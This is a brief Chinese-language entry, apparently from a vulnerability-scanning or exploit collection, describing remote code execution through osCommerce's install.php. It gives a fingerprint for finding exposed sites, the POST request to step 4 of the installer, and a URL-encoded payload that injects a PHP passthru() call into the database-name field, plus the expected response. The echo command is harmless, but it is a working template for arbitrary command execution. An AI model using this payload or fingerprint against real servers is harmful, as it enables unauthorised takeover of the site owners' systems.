# osCommerceinstall.php远程代码执行漏洞

osCommerceinstall.php ｜ 命令执行 ｜ —
- **指纹**：`body="www.oscommerce.com"`
- **请求**：`POST /install/install.php?step=4 HTTP/1.1`

**Payload**
```
DIR_FS_DOCUMENT_ROOT=.%2F&DB_DATABASE=%27%29%3Bpassthru%28%27echo+Hello+World%21%27%29%3B%2F%2A
```
- **响应特征**：200 Hello